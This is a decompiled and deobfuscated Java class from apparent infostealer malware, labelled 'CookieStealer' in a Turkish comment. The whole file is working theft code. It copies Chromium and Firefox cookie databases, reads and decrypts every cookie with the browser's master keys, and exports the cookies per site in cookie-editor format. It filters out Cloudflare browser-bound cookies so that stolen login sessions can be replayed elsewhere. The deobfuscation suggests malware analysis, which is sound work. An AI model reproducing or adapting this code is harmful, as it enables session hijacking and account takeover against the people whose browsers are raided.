/*\n * ========================================\n * DEOBFUSCATED: CookieStealer.java\n * Original: c/l.java\n * ----------------------------------------\n * Cookie hırsızı - Chromium Cookies DB + Firefox cookies.sqlite\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.d;
import c.f;
import c.g$MasterKeys;
import c.i;
import c.j;
import c.l$Cookie;
import c.r;
import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

public final class l
extends j {
    private final List<l$Cookie> d = new ArrayList<l$Cookie>();

    public l(f f2) {
        super(f2, l.resolveCookieRelativePath(f2), f2.getBrowser().getInfo().isFirefox() ? "moz_cookies" /* r.mc() */ : "cookies" /* r.ck() */);
        this.findResultSets();
    }

    private static String resolveCookieRelativePath(f f2) {
        if (f2.getBrowser().getInfo().isFirefox()) {
            return "cookies.sqlite" /* r.csql() */;
        }
        File file = new File(f2.getDirectory(), "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */);
        if (file.isFile()) {
            return "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */;
        }
        File file2 = new File(f2.getDirectory(), "Cookies" /* r.ckf() */);
        if (file2.isFile()) {
            return "Cookies" /* r.ckf() */;
        }
        return "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */;
    }

    @Override
    public void findResultSets() {
        if (this.getProfile().getBrowser().getInfo().isFirefox()) {
            this.queryFirefoxStore();
            return;
        }
        File[] fileArray = new File[]{new File(this.getProfile().getDirectory(), "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */), new File(this.getProfile().getDirectory(), "Cookies" /* r.ckf() */)};
        boolean bl = false;
        for (File file : fileArray) {
            if (!file.exists()) continue;
            bl = true;
            this.readChromiumCookieDatabase(file);
        }
        if (!bl) {
            super.findResultSets();
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void readChromiumCookieDatabase(File file) {
        try {
            Class.forName("org.sqlite.JDBC");
        }
        catch (ClassNotFoundException classNotFoundException) {
            return;
        }
        File file2 = null;
        try {
            file2 = c.d.copyToTemp(file);
            if (file2 == null || !file2.exists()) {
                return;
            }
            try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" /* r.sq() */ + file2.getAbsolutePath());
                 Statement statement = connection.createStatement();
                 ResultSet resultSet = statement.executeQuery("SELECT * FROM " + "cookies" /* r.ck() */);){
                while (resultSet.next()) {
                    try {
                        this.onResultSetFound(resultSet);
                    }
                    catch (Exception exception) {}
                }
            }
        }
        catch (Exception exception) {
        }
        finally {
            if (file2 != null && file2.exists()) {
                try {
                    file2.delete();
                }
                catch (Exception exception) {}
            }
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void queryFirefoxStore() {
        try {
            Class.forName("org.sqlite.JDBC");
        }
        catch (ClassNotFoundException classNotFoundException) {
            return;
        }
        File file = this.getProfile().getDirectory();
        File file2 = new File(file, "cookies.sqlite" /* r.csql() */);
        if (!file2.exists()) {
            return;
        }
        File file3 = null;
        try {
            file3 = c.d.copyToTemp(file2);
            if (file3 == null || !file3.exists()) {
                return;
            }
            try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" /* r.sq() */ + file3.getAbsolutePath());
                 Statement statement = connection.createStatement();
                 ResultSet resultSet = statement.executeQuery("SELECT host, path, name, " + "value" /* r.vl() */ + ", expiry, isSecure, isHttpOnly, creationTime, lastAccessed FROM " + "moz_cookies" /* r.mc() */);){
                while (resultSet.next()) {
                    try {
                        this.d.add(new l$Cookie(resultSet, null, true));
                    }
                    catch (Exception exception) {}
                }
            }
        }
        catch (Exception exception) {
        }
        finally {
            if (file3 != null && file3.exists()) {
                try {
                    file3.delete();
                }
                catch (Exception exception) {}
            }
        }
    }

    @Override
    public String toCsvColumn() {
        StringBuilder stringBuilder = new StringBuilder();
        for (l$Cookie l$Cookie : this.d) {
            String[] stringArray;
            String string = l$Cookie.toNetscapeFormat();
            if (string == null || string.trim().isEmpty() || (stringArray = string.split("\t")).length < 7 || stringArray[6] == null || stringArray[6].trim().isEmpty()) continue;
            stringBuilder.append(string);
        }
        return stringBuilder.toString();
    }

    @Override
    public void onResultSetFound(ResultSet resultSet) {
        try {
            g$MasterKeys g$MasterKeys = this.getProfile().getBrowser().getMasterKeys();
            l$Cookie l$Cookie = new l$Cookie(resultSet, g$MasterKeys);
            if (l$Cookie.getDomain() != null && !l$Cookie.getDomain().isEmpty() || l$Cookie.getName() != null && !l$Cookie.getName().isEmpty()) {
                this.d.add(l$Cookie);
            }
        }
        catch (SQLException sQLException) {
            // empty catch block
        }
    }

    public int getCount() {
        return this.d.size();
    }

    public int getValidCount() {
        return this.validCookies().size();
    }

    public List<l$Cookie> getCookies() {
        return new ArrayList<l$Cookie>(this.d);
    }

    public JSONArray toJsonArray() {
        JSONArray jSONArray = new JSONArray();
        String string = this.getProfile().getBrowser().getInfo().getBrowserName();
        String string2 = this.getProfile().getDirectory().getName();
        for (l$Cookie l$Cookie : this.d) {
            JSONObject jSONObject = l$Cookie.toJson(string, string2);
            if (jSONObject == null) continue;
            jSONArray.put(jSONObject);
        }
        return jSONArray;
    }

    public String toNetscapeDocument() {
        return l.buildNetscapeDocument(this.validCookies());
    }

    public Map<String, String> netscapeBySite() {
        LinkedHashMap<String, String> linkedHashMap = new LinkedHashMap<String, String>();
        for (Map.Entry<String, List<l$Cookie>> entry : l.groupBySite(this.validCookies()).entrySet()) {
            linkedHashMap.put(entry.getKey(), l.buildNetscapeDocument(entry.getValue()));
        }
        return linkedHashMap;
    }

    public Map<String, String> netscapeLoginBySite() {
        LinkedHashMap<String, String> linkedHashMap = new LinkedHashMap<String, String>();
        for (Map.Entry<String, List<l$Cookie>> entry : l.groupBySite(this.validCookies()).entrySet()) {
            List<l$Cookie> list = l.loginPortable(entry.getValue());
            if (list.isEmpty() || list.size() >= entry.getValue().size()) continue;
            linkedHashMap.put(entry.getKey(), l.buildNetscapeDocument(list));
        }
        return linkedHashMap;
    }

    private List<l$Cookie> validCookies() {
        ArrayList<l$Cookie> arrayList = new ArrayList<l$Cookie>();
        for (l$Cookie l$Cookie : this.d) {
            String string = l$Cookie.getValue();
            if (string == null || string.isEmpty() || !l.isReadableValue(string)) continue;
            arrayList.add(l$Cookie);
        }
        return arrayList;
    }

    private static boolean isReadableValue(String string) {
        if (string == null || string.trim().isEmpty()) {
            return false;
        }
        int n2 = 0;
        for (int i2 = 0; i2 < string.length(); ++i2) {
            char c2 = string.charAt(i2);
            if (c2 >= ' ' || c2 == '\t' || c2 == '\n' || c2 == '\r') continue;
            ++n2;
        }
        return n2 == 0 || n2 * 10 < string.length();
    }

    private static Map<String, List<l$Cookie>> groupBySite(List<l$Cookie> list) {
        LinkedHashMap<String, List<l$Cookie>> linkedHashMap = new LinkedHashMap<String, List<l$Cookie>>();
        for (l$Cookie l$Cookie : list) {
            String string = i.siteKey(l$Cookie.getDomain());
            linkedHashMap.computeIfAbsent(string, l::lambda$groupBySite$0).add(l$Cookie);
        }
        return linkedHashMap;
    }

    private static boolean isBrowserBoundCookie(l$Cookie l$Cookie) {
        String string = l$Cookie.getName();
        return "__cf_bm".equals(string) || "cf_clearance".equals(string) || "_cfuvid".equals(string);
    }

    private static List<l$Cookie> loginPortable(List<l$Cookie> list) {
        ArrayList<l$Cookie> arrayList = new ArrayList<l$Cookie>();
        for (l$Cookie l$Cookie : list) {
            if (l.isBrowserBoundCookie(l$Cookie)) continue;
            arrayList.add(l$Cookie);
        }
        return arrayList;
    }

    static String buildNetscapeDocument(List<l$Cookie> list) {
        StringBuilder stringBuilder = new StringBuilder();
        for (l$Cookie l$Cookie : list) {
            String string = l$Cookie.toCookieEditorNetscapeLine();
            if (string == null || string.isEmpty()) continue;
            stringBuilder.append(string);
        }
        return stringBuilder.toString();
    }

    private static List lambda$groupBySite$0(String string) {
        return new ArrayList();
    }
}

